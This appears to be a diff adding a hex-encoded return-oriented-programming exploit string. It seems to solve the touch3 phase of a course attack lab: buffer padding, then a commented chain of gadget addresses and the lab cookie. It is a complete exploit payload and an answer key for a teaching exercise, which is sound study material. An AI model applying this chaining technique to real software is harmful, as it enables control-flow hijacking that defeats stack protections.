@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* end of buffer */
+ab 1a 40 00 00 00 00 00 /* move rsp to rax gadget */
+9b 19 40 00 00 00 00 00 /* move rax to rdi gadget */
+b8 19 40 00 00 00 00 00 /* pop rax gadget */
+48 00 00 00 00 00 00 00 /* empty zero row */
+88 1a 40 00 00 00 00 00 /* eax to edx gadget */
+40 1a 40 00 00 00 00 00 /* edx to ecx gadget */
+70 1a 40 00 00 00 00 00 /* ecx to esi gadget */
+d5 19 40 00 00 00 00 00 /* address to add_xy */
+9b 19 40 00 00 00 00 00 /* move rax to rdi gadget */
+0c 19 40 00 00 00 00 00 /* address of touch3 */
+34 30 63 31 35 31 33 30 /* cookie as string */
